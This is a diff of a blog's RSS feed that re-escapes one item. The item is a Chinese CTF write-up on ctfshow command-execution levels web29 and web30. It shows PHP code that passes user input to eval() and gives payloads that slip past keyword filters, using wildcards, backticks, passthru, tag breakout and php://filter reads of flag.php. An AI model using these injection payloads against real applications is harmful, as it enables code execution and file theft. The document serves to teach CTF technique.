@@ -13,8 +13,16 @@
       <pubDate>Thu, 25 Feb 2021 22:44:08 +0800</pubDate>
       
       <guid>https://hzlhy.github.io/post/ctfshow_webrm29_124/</guid>
-      <description>ctfshow web 入门命令执行 web29 &amp;lt;?php error_reporting(0); if(isset($_GET[&#39;c&#39;])){ $c = $_GET[&#39;c&#39;]; if(!preg_match(&amp;quot;/flag/i&amp;quot;, $c)){ eval($c); } }else{ highlight_file(__FILE__); } 知识点：通配符； 看到有eval()执行函数 过滤了flag ，可以使用通配符进行绕过。所以payload为：c=system(&#39;cat f*&#39;);返回的flag进行了隐藏，右键查看源码即可。 也可以通过文件包含来解决，payload： 先传入?c=echo &amp;quot;lhy&amp;quot;;?&amp;gt;ctfshow &amp;lt;?php system(&#39;ls&#39;);看到有flag.php文件（前面需要echo &amp;ldquo;lhy&amp;rdquo;;?&amp;gt;是因为传入c的时候表示一段代码的开始，?&amp;gt;结束后开始执行后面的代码），接下来的为?c=echo &amp;quot;lhy&amp;quot;; ?&amp;gt;ctfshow &amp;lt;?php include($_GET[&#39;url&#39;]);&amp;amp;url=php://filter/read=convert.base64-encode/resource=flag.php 补充：对于linux cat 和ca&#39;&amp;rsquo;t ca\t ca&amp;quot;&amp;ldquo;t效果是相同的，这样可以绕过字符的限制，如c=system(&#39;ca\t fla\g.php&#39;);
-web30 &amp;lt;?php error_reporting(0); if(isset($_GET[&#39;c&#39;])){ $c = $_GET[&#39;c&#39;]; if(!preg_match(&amp;quot;/flag|system|php/i&amp;quot;, $c)){ eval($c); } }else{ highlight_file(__FILE__); } 知识点：反引号执行系统命令； 与29相比增加了对命令函数的过滤，命令执行函数有很多，如 system() passthru() exec() shell_exec() popen() proc_open() pcntl_exec() 反引号 只有system函数是有回显的，其它函数可以通过echo等显示，这里采用反引号绕过 payload1:c=echo `cat f*`; payload2:?c=passthru(&amp;quot;cat f*&amp;quot;); 还可以采用文件包含： payload3:?c=echo &amp;quot;lhy &amp;quot;; include($_GET[&#39;url&#39;]); ?</description>
+      <description>ctfshow web 入门命令执行 web29 &amp;lt;?php error_reporting(0); if(isset($_GET[&amp;#39;c&amp;#39;])){ $c = $_GET[&amp;#39;c&amp;#39;]; if(!preg_match(&amp;#34;/flag/i&amp;#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); } 知识点：通配符； 看到有eval()执行函数 过滤了flag ，可以使用通配符进行绕过。所以payload为：c=system(&#39;cat f*&#39;);返回的flag进行了隐藏，右键查看源码即可。 也可以通过文件包含来解决，payload： 先传入?c=echo &amp;quot;lhy&amp;quot;;?&amp;gt;ctfshow &amp;lt;?php system(&#39;ls&#39;);看到有flag.php文件（前面需要echo &amp;ldquo;lhy&amp;rdquo;;?&amp;gt;是因为传入c的时候表示一段代码的开始，?&amp;gt;结束后开始执行后面的代码），接下来的为?c=echo &amp;quot;lhy&amp;quot;; ?&amp;gt;ctfshow &amp;lt;?php include($_GET[&#39;url&#39;]);&amp;amp;url=php://filter/read=convert.base64-encode/resource=flag.php 补充：对于linux cat 和ca&#39;&amp;rsquo;t ca\t ca&amp;quot;&amp;ldquo;t效果是相同的，这样可以绕过字符的限制，如c=system(&#39;ca\t fla\g.php&#39;);
+web30 &amp;lt;?php error_reporting(0); if(isset($_GET[&amp;#39;c&amp;#39;])){ $c = $_GET[&amp;#39;c&amp;#39;]; if(!preg_match(&amp;#34;/flag|system|php/i&amp;#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); } 知识点：反引号执行系统命令； 与29相比增加了对命令函数的过滤，命令执行函数有很多，如 system()
+passthru()
+exec()
+shell_exec()
+popen()
+proc_open()
+pcntl_exec()
+反引号
+只有system函数是有回显的，其它函数可以通过echo等显示，这里采用反引号绕过 payload1:c=echo `cat f*`; payload2:?c=passthru(&amp;quot;cat f*&amp;quot;); 还可以采用文件包含： payload3:?c=echo &amp;quot;lhy &amp;quot;; include($_GET[&#39;url&#39;]); ?</description>
     </item>
     
     <item>
